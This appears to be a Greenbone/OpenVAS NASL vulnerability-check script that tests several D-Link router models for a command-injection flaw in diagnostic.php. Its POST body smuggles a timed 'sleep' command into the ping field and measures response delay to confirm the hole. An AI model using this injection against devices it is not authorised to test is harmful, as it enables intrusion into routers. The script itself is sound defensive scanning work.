if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103691" );
	script_bugtraq_id( 58938 );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2013-04-09 12:07:13 +0200 (Tue, 09 Apr 2013)" );
	script_name( "Multiple D-Link Products Command Injection and Multiple Information Disclosue Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_dlink_dsl_detect.sc", "gb_dlink_dap_detect.sc", "gb_dlink_dir_detect.sc", "gb_dlink_dwr_detect.sc" );
	script_mandatory_keys( "Host/is_dlink_device" );
	script_require_ports( "Services/www", 80, 8080 );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/58938" );
	script_xref( name: "URL", value: "http://www.dlink.com/" );
	script_xref( name: "URL", value: "http://www.s3cur1ty.de/m1adv2013-017" );
	script_tag( name: "solution", value: "Reportedly the issue is fixed. Please contact the vendor for more information." );
	script_tag( name: "summary", value: "Multiple D-Link products are prone to a command-injection
  vulnerability and multiple information-disclosure vulnerabilities." );
	script_tag( name: "impact", value: "Exploiting these issues could allow an attacker to gain
  access to potentially sensitive information and execute arbitrary commands in
  the context of the affected device." );
	script_tag( name: "affected", value: "DIR-600 / DIR-300 revB / DIR-815 / DIR-645 / DIR-412 / DIR-456 / DIR-110.

  Other devices and models might be affected as well." );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
CPE_PREFIX = "cpe:/o:d-link";
require("host_details.inc.sc");
require("http_func.inc.sc");
if(!infos = get_app_port_from_cpe_prefix( cpe: CPE_PREFIX, service: "www" )){
	exit( 0 );
}
port = infos["port"];
CPE = infos["cpe"];
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
count = 0;
url = dir + "/diagnostic.php";
for sleep in make_list( 3,
	 5,
	 10 ) {
	ex = "act=ping&dst=%3b%20sleep " + sleep + "%3b";
	len = strlen( ex );
	req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n", "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\\r\\n", "Accept-Encoding: identity\\r\\n", "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\\r\\n", "Referer: http://", host, "/\\r\\n", "Content-Length: ", len, "\\r\\n", "Cookie: uid=hfaiGzkB4z\\r\\n", "\\r\\n", ex );
	start = unixtime();
	result = http_send_recv( port: port, data: req );
	stop = unixtime();
	if( stop - start < sleep || stop - start > ( sleep + 5 ) ) {
		continue;
	}
	else {
		count++;
	}
}
if(count > 1){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
}
exit( 0 );

